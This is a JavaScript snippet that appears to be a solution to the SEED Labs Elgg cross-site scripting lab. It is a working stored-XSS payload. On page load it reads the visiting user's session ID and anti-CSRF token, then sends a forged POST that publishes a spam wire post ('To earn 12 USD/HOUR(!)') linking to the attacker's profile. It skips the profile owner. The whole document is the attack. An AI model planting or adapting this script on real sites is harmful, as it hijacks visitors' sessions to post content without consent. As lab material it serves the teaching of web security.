<script type="text/javascript">


	window.onload = function(){
        //JavaScript code to access user name, user guid, Time Stamp __elgg_ts
        //and Security Token __elgg_token

        var ts = elgg.security.token.__elgg_ts;
        var token = elgg.security.token.__elgg_token;
        var sessionUser_id = elgg.session.user.guid;
        var name = elgg.session.user.name;
        var owner_id = elgg.page_owner.guid;
        var owner_name = elgg.page_owner.name;


        var content_array = [];

        var post_profile = "To earn 12 USD/HOUR(!), visit now: http://www.seed-server.com/profile/"+ owner_name;


        var attributes = {
            '__elgg_token': token,
            '__elgg_ts': ts,
            'body': post_profile,
        }


        for (var attribute in attributes) {
            content_array.push(`${encodeURIComponent(attribute)}=${encodeURIComponent(attributes[attribute])}`);
        }


        //Construct the content of your url.
        var sendurl='http://www.seed-server.com/action/thewire/add'; //FILL IN
        var content = content_array.join("&"); //FILL IN
        
        if( sessionUser_id != owner_id ) { //Condition to check if the user is not Samy) 
            //Create and send Ajax request to modify profile
            var Ajax=null;
            Ajax=new XMLHttpRequest();
            Ajax.open("POST",sendurl,true);
            // Ajax.setRequestHeader("Host","www.seed-server.com");
            Ajax.setRequestHeader("Content-Type",
            "application/x-www-form-urlencoded;charset=UTF-8");
            Ajax.send(content);
        }
	}

</script>